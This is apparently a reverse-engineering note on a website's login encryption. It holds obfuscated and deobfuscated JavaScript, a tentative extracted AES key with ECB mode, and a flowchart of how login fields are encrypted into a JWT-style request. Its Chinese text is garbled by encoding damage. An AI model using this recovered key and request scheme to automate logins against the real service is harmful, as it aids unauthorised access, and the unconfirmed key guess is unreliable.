\\u0065\\u0072\\u004d\\u006f\\u0064\\u0065&quot;,&quot;TnZGlN55&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;rorre&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;),&quot;\\u0039\\u006d\\u0043\\u0047\\u004b\\u004d\\u0054&quot;,&#x27;207890VhBBQE&#x27;,&quot;\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0042\\u006c\\u006f\\u0063\\u006b&quot;];_0x5154=function()&#123;return _0x31fd54;&#125;;return _0x5154();&#125;_0x5f=0x9;var aeskey=function(_0x3f2016)&#123;var _0x4a103f;function _0x1920ce(_0x59e125,_0x554a7d,_0x5133f6,_0x110b7f,_0x54a95f)&#123;return _0x443f(_0x5133f6- -0x187,_0x59e125);&#125;var _0x435ae5=_0x3f2016[&quot;\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068&quot;];function _0x82f4cd(_0x2ae74f,_0x41daa4,_0x3ff6ff,_0x1f1b0e,_0x1249c1)&#123;return _0x443f(_0x41daa4-0x3ac,_0x1249c1);&#125;function _0x4116f3(_0x528f7a,_0x2f6820,_0x15364f,_0x1c9966,_0x57853b)&#123;return _0x443f(_0x15364f-0x2ab,_0x57853b);&#125;function _0x463cdc(_0x3344bd,_0x2a003b,_0x4862fa,_0x3797da,_0x22c871)&#123;return _0x443f(_0x3344bd-0x55,_0x4862fa);&#125;_0x4a103f=0x1;if(_0x435ae5&gt;(0xdb71e^0xdb70e))&#123;_0x3f2016=_0x3f2016[&#x27;substring&#x27;](0x1fc64^0x1fc64,0x53c69^0x53c79);&#125;if(_0x435ae5&lt;(0x2011b^0x2010b))&#123;if(_0x463cdc(0x73,0x63,0x68,0x63,0x65)===_0x463cdc(0x73,0x6a,0x7b,0x66,0x6b))&#123;var _0x4a8e78;var _0xc0aad7=(0x7097b^0x7096b)-_0x435ae5;_0x4a8e78=_0x1920ce(-0x177,-0x174,-0x172,-0x16b,-0x166);var _0x145175=[&#x27;G&#x27;,&quot;\\u005a&quot;,&#x27;Z&#x27;,&#x27;S&#x27;];for(var _0x21fe72=0x3dbf9^0x3dbf9;_0x21fe72&lt;_0xc0aad7;_0x21fe72++)&#123;console[&#x27;error&#x27;](_0x145175[_0x21fe72%(0xb4917^0xb4913)]);_0x3f2016=_0x3f2016+_0x145175[_0x21fe72%(0x904a3^0x904a7)];&#125;&#125;else&#123;var _0x1ed31f;var _0xa8c99e=(0x7097b^0x7096b)-_0xd66675;_0x1ed31f=_0x4116f3(0x2c3,0x2cd,0x2c0,0x2af,0x2b4);var _0x1aa99a=[&quot;\\u0047&quot;,&quot;\\u005a&quot;,&#x27;Z&#x27;,&#x27;S&#x27;];for(var _0x32f003=0x3dbf9^0x3dbf9;_0x32f003&lt;_0xa8c99e;_0x32f003++)&#123;_0x19b9fe[&quot;\\u0065\\u0072\\u0072\\u006f\\u0072&quot;](_0x1aa99a[_0x32f003%(0xb4917^0xb4913)]);_0x50f28f=_0x3d143f+_0x1aa99a[_0x32f003%(0x904a3^0x904a7)];&#125;&#125;&#125;return _0x3f2016;&#125;(aeskeyOriginal);function Encrypt(_0xd38f18)&#123;var _0x24f3da=CryptoJS[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](aeskey);var _0x496e2a=0x0+0x5;var _0x1d81ab=CryptoJS[&quot;\\u0065\\u006e\\u0063&quot;][&quot;\\u0055\\u0074\\u0066\\u0038&quot;][&#x27;parse&#x27;](_0xd38f18);_0x496e2a=0x2;var _0x4e1e84=CryptoJS[&#x27;AES&#x27;][&#x27;encrypt&#x27;](_0x1d81ab,_0x24f3da,&#123;&#x27;mode&#x27;:getEcb(),&#x27;padding&#x27;:CryptoJS[&quot;\\u0070\\u0061\\u0064&quot;][&quot;\\u0050\\u006b\\u0063\\u0073\\u0037&quot;]&#125;);return _0x4e1e84[&#x27;toString&#x27;]();&#125;function getEcb()&#123;var _0x359456;var _0xd82ce2=CryptoJS[&quot;\\u006c\\u0069\\u0062&quot;][&quot;\\u0042\\u006c\\u006f\\u0063\\u006b\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u004d\\u006f\\u0064\\u0065&quot;][&quot;\\u0065\\u0078\\u0074\\u0065\\u006e\\u0064&quot;]();_0x359456=_0x248003(-0x290,-0x297,-0x28b,-0x29b,-0x28e);_0xd82ce2[&#x27;Encryptor&#x27;]=_0xd82ce2[&#x27;extend&#x27;](&#123;&quot;\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u006c\\u006f\\u0063\\u006b&quot;:function(_0x1ee2c8,_0x5518cc)&#123;this[&quot;\\u005f\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072&quot;][&quot;\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0042\\u006c\\u006f\\u0063\\u006b&quot;](_0x1ee2c8,_0x5518cc);&#125;&#125;);_0xd82ce2[&quot;\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u0072&quot;]=_0xd82ce2[&#x27;extend&#x27;](&#123;&#x27;processBlock&#x27;:function(_0x4e4888,_0x164758)&#123;function _0x22d224(_0x2fcea5,_0xc2e735,_0xe53dfd,_0x50985f,_0x500d93)&#123;return _0x443f(_0xe53dfd-0x1e9,_0xc2e735);&#125;function _0x4e16ee(_0x5dc972,_0x16f7c4,_0x7996d1,_0x4ee193,_0x3accff)&#123;return _0x443f(_0x16f7c4-0x27,_0x4ee193);&#125;if(_0x22d224(0x200,0x20f,0x203,0x206,0x1fc)!==_0x4e16ee(0x30,0x41,0x3d,0x3d,0x36))&#123;var _0x3d5956=_0x318c97[&quot;\\u0065\\u006e\\u0063&quot;][&#x27;Utf8&#x27;][&quot;\\u0070\\u0061\\u0072\\u0073\\u0065&quot;](_0x434618);var _0x1f437c=0x0+0x5;var _0x59156a=_0x4556a7[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](_0x4f1109);_0x1f437c=0x2;var _0x37244f=_0x5e06d2[&quot;\\u0041\\u0045\\u0053&quot;][&#x27;encrypt&#x27;](_0x59156a,_0x3d5956,&#123;&quot;\\u006d\\u006f\\u0064\\u0065&quot;:_0x45b1d0(),&quot;\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067&quot;:_0x1c4aa3[&quot;\\u0070\\u0061\\u0064&quot;][&quot;\\u0050\\u006b\\u0063\\u0073\\u0037&quot;]&#125;);return _0x37244f[&#x27;toString&#x27;]();&#125;else&#123;this[&#x27;_cipher&#x27;][&#x27;decryptBlock&#x27;](_0x4e4888,_0x164758);&#125;&#125;&#125;);function _0x248003(_0x1527d3,_0x5dcae2,_0x25f174,_0x213d3a,_0x33d22c)&#123;return _0x443f(_0x213d3a- -0x2ae,_0x33d22c);&#125;return _0xd82ce2;&#125;\næ˜æ˜¾çš„æ··æ·†ï¼Œåä¸€ä¸‹ã€‚https://obf-io.deobfuscate.io/\nvar CryptoJS = document.write(&quot;&gt;tpircs/&lt;&gt;&#x27;sj.sea/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));var base64 = document.write(&quot;&gt;tpircs/&lt;&gt;&#x27;sj.46esab/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));(function (_0x2aea55, _0x2e748c) &#123;  var _0x2ad42e = _0x2aea55();  while (true) &#123;    try &#123;      var _0x122ced = parseInt(_0x443f(5, -0x267)) / 0x1 * (parseInt(_0x443f(27, -0x249)) / 0x2) + -parseInt(_0x443f(22, 0x17f)) / 0x3 * (-parseInt(_0x443f(16, -0x267)) / 0x4) + -parseInt(_0x443f(33, -0x178)) / 0x5 * (parseInt(_0x443f(28, 0x3db)) / 0x6) + parseInt(_0x443f(4, -0x26a)) / 0x7 + parseInt(_0x443f(23, -0x260)) / 0x8 + parseInt(_0x443f(0, -0x178)) / 0x9 * (parseInt(_0x443f(1, 0x161)) / 0xa) + -parseInt(_0x443f(12, -0x264)) / 0xb;      if (_0x122ced === _0x2e748c) &#123;        break;      &#125; else &#123;        _0x2ad42e.push(_0x2ad42e.shift());      &#125;    &#125; catch (_0x40a231) &#123;      _0x2ad42e.push(_0x2ad42e.shift());    &#125;  &#125;&#125;)(_0x5154, 0x37ac5);var _0x5f = 15;function _0x4d1802(_0x5ec7f3, _0x5d6a04, _0x4eea62, _0x3948d7, _0x3e3f76) &#123;  return _0x443f(_0x3e3f76 + 0x1f5, _0x3948d7);&#125;var aeskeyOriginal = _0x443f(24, -0x1d6);function _0x443f(_0x3c35be, _0x5154ce) &#123;  var _0x443fce = _0x5154();  _0x443f = function (_0x56e89c, _0x384a2) &#123;    _0x56e89c = _0x56e89c - 0x0;    var _0x5089ac = _0x443fce[_0x56e89c];    return _0x5089ac;  &#125;;  return _0x443f(_0x3c35be, _0x5154ce);&#125;function _0x5154() &#123;  var _0x31fd54 = [&quot;enc&quot;, &quot;KINoJq9212251&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;VwGnXp112&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;parse&quot;, &quot;kcolBtpyrced&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;gnirtsbus&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;htgnel&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;Pkcs7&#x27;, &quot;dap&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;bfkGlR4990788&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;lib&#x27;, &quot;dnetxe&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;Utf8&quot;, &quot;JZWyCW6922411&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;Encryptor&quot;, &quot;AES&quot;, &quot;cdph&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;Decryptor&quot;, &#x27;ehpe&#x27;, &quot;3sVABFb&quot;, &#x27;3260760oYubim&#x27;, &#x27;202306045YDZCWGZ&#x27;, &quot;rehpic_&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;FbKtv&#x27;, &quot;ClRYxq0501&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;4194meseVb&#x27;, &quot;gnirtSot&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;jrCCd&#x27;, &quot;encrypt&quot;, &quot;BlockCipherMode&quot;, &quot;TnZGlN55&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;rorre&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;9mCGKMT&quot;, &#x27;207890VhBBQE&#x27;, &quot;encryptBlock&quot;];  _0x5154 = function () &#123;    return _0x31fd54;  &#125;;  return _0x5154();&#125;_0x5f = 0x9;var aeskey = function (_0x3f2016) &#123;  var _0x435ae5 = _0x3f2016.length;  if (_0x435ae5 &gt; 16) &#123;    _0x3f2016 = _0x3f2016.substring(0, 16);  &#125;  if (_0x435ae5 &lt; 16) &#123;    if (_0x443f(30, 0x68) === _0x443f(30, 0x7b)) &#123;      var _0x4a8e78;      var _0xc0aad7 = 16 - _0x435ae5;      _0x4a8e78 = _0x443f(21, -0x177);      var _0x145175 = [&#x27;G&#x27;, &quot;Z&quot;, &#x27;Z&#x27;, &#x27;S&#x27;];      for (var _0x21fe72 = 0; _0x21fe72 &lt; _0xc0aad7; _0x21fe72++) &#123;        console.error(_0x145175[_0x21fe72 % 4]);        _0x3f2016 = _0x3f2016 + _0x145175[_0x21fe72 % 4];      &#125;    &#125; else &#123;      var _0x1ed31f;      var _0xa8c99e = 16 - _0xd66675;      _0x1ed31f = _0x443f(21, 0x2b4);      var _0x1aa99a = [&quot;G&quot;, &quot;Z&quot;, &#x27;Z&#x27;, &#x27;S&#x27;];      for (var _0x32f003 = 0; _0x32f003 &lt; _0xa8c99e; _0x32f003++) &#123;        _0x19b9fe.error(_0x1aa99a[_0x32f003 % 4]);        _0x50f28f = _0x3d143f + _0x1aa99a[_0x32f003 % 4];      &#125;    &#125;  &#125;  return _0x3f2016;&#125;(aeskeyOriginal);function Encrypt(_0xd38f18) &#123;  var _0x24f3da = CryptoJS.enc.Utf8.parse(aeskey);  var _0x496e2a = 5;  var _0x1d81ab = CryptoJS.enc.Utf8.parse(_0xd38f18);  _0x496e2a = 0x2;  var _0x4e1e84 = CryptoJS.AES.encrypt(_0x1d81ab, _0x24f3da, &#123;    &#x27;mode&#x27;: getEcb(),    &#x27;padding&#x27;: CryptoJS.pad.Pkcs7  &#125;);  return _0x4e1e84.toString();&#125;function getEcb() &#123;  var _0x359456;  var _0xd82ce2 = CryptoJS.lib.BlockCipherMode.extend();  _0x359456 = _0x443f(19, -0x28e);  _0xd82ce2.Encryptor = _0xd82ce2.extend(&#123;    &quot;processBlock&quot;: function (_0x1ee2c8, _0x5518cc) &#123;      this._cipher.encryptBlock(_0x1ee2c8, _0x5518cc);    &#125;  &#125;);  _0xd82ce2.Decryptor = _0xd82ce2.extend(&#123;    &#x27;processBlock&#x27;: function (_0x4e4888, _0x164758) &#123;      if (_0x443f(26, 0x20f) !== _0x443f(26, 0x3d)) &#123;        var _0x3d5956 = _0x318c97.enc.Utf8.parse(_0x434618);        var _0x1f437c = 5;        var _0x59156a = _0x4556a7.enc.Utf8.parse(_0x4f1109);        _0x1f437c = 0x2;        var _0x37244f = _0x5e06d2.AES.encrypt(_0x59156a, _0x3d5956, &#123;          &quot;mode&quot;: _0x45b1d0(),          &quot;padding&quot;: _0x1c4aa3.pad.Pkcs7        &#125;);        return _0x37244f.toString();      &#125; else &#123;        this._cipher.decryptBlock(_0x4e4888, _0x164758);      &#125;    &#125;  &#125;);  return _0xd82ce2;&#125;\nè¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œè®©aiè¯»ä¸‹ï¼šå¾ˆç¬¨ï¼Œä½†æ˜¯æ¨æµ‹AESkeyä¸ºencryptBlockGZZS,åŠ å¯†æ–¹å¼ä¸ºECBï¼ˆæ²¡æœ‰åŠ å¯†å‘é‡ï¼‰ç›®å‰AESè¿˜æ²¡è§£å‡ºæ¥åŠ å¯†æµç¨‹å›¾å‚è€ƒï¼š\nflowchart TD    A[JSç¨‹åºç”ŸæˆUUID] --&gt; B[å°†UUIDä¼ ç»™éªŒè¯ç æ¥å£]    B --&gt; C[éªŒè¯ç æ¥å£è¿”å›ä¸€æ¬¡æ€§éªŒè¯ç ]    C --&gt; D[ç”¨æˆ·è¾“å…¥è´¦å·ã€å¯†ç ã€éªŒè¯ç ]    D --&gt; E[JSç¨‹åºæ¥æ”¶è´¦å·ã€å¯†ç ã€éªŒè¯ç ]    E --&gt; F1[&quot;å¯¹è´¦å·è¿›è¡ŒAES(ECBæ¨¡å¼)åŠ å¯†&quot;]    E --&gt; F2[&quot;å¯¹å¯†ç è¿›è¡ŒAES(ECBæ¨¡å¼)åŠ å¯†&quot;]    E --&gt; F3[&quot;å¯¹éªŒè¯ç è¿›è¡ŒAES(ECBæ¨¡å¼)åŠ å¯†&quot;]    E --&gt; F4[&quot;å¯¹ecatidè¿›è¡ŒAES(ECBæ¨¡å¼)åŠ å¯†&quot;]    E --&gt; F5[&quot;å¯¹accsmsè¿›è¡ŒAES(ECBæ¨¡å¼)åŠ å¯†&quot;]    F1 --&gt; G1[å°†åŠ å¯†åçš„è´¦å·è¿›è¡ŒBase64è½¬ç ]    F2 --&gt; G2[å°†åŠ å¯†åçš„å¯†ç è¿›è¡ŒBase64è½¬ç ]    F3 --&gt; G3[å°†åŠ å¯†åçš„éªŒè¯ç è¿›è¡ŒBase64è½¬ç ]    F4 --&gt; G4[å°†åŠ å¯†åçš„ecatidè¿›è¡ŒBase64è½¬ç ]    F5 --&gt; G5[å°†åŠ å¯†åçš„accsmsè¿›è¡ŒBase64è½¬ç ]    E --&gt; H[è·å–versionå­—æ®µ]    E --&gt; I[è·å–typeå­—æ®µ]    E --&gt; J[è·å–vtypeå­—æ®µ]    E --&gt; K[è·å–uuidå­—æ®µ]    K --&gt; L[å°†UUIDè¿›è¡ŒåŠ å¯†]    E --&gt; M1[è·å–Timestampå­—æ®µ]    E --&gt; N1[è·å–catidå­—æ®µ]    N1 --&gt; O1[&quot;å¯¹catidè¿›è¡ŒAES(ECBæ¨¡å¼)åŠ å¯†&quot;]    O1 --&gt; P1[å°†åŠ å¯†åçš„catidè¿›è¡ŒBase64è½¬ç ]    G1 --&gt; Q[ç”ŸæˆJWTçš„payload]    G2 --&gt; Q    G3 --&gt; Q    G4 --&gt; Q    G5 --&gt; Q    P1 --&gt; Q    H --&gt; Q    I --&gt; Q    J --&gt; Q    L --&gt; Q    M1 --&gt; Q    Q --&gt; R[&quot;å¯¹payloadè¿›è¡ŒJWTç¼–ç (ä½¿ç”¨æœåŠ¡å™¨å¯†é’¥)&quot;]    R --&gt; S[å»æ‰JWTç¼–ç åçš„headerå’Œç­¾å]    S --&gt; T[å°†JWTç¼–ç åçš„ä¿¡æ¯è¿›è¡ŒURLè½¬ç ]    T --&gt; U[å°†URLè½¬ç åçš„ä¿¡æ¯æ”¾å…¥è¯·æ±‚åŒ…body]    U --&gt; V[å‘é€è¯·æ±‚]    subgraph åŠ å¯†å’Œè½¬ç æµç¨‹    F1 --&gt; G1    F2 --&gt; G2    F3 --&gt; G3    F4 --&gt; G4    F5 --&gt; G5    O1 --&gt; P1    end    subgraph è·å–å­—æ®µ    E --&gt; H    E --&gt; I    E --&gt; J    E --&gt; K    E --&gt; M1    E --&gt; N1    N1 --&gt; O1    end\n"}]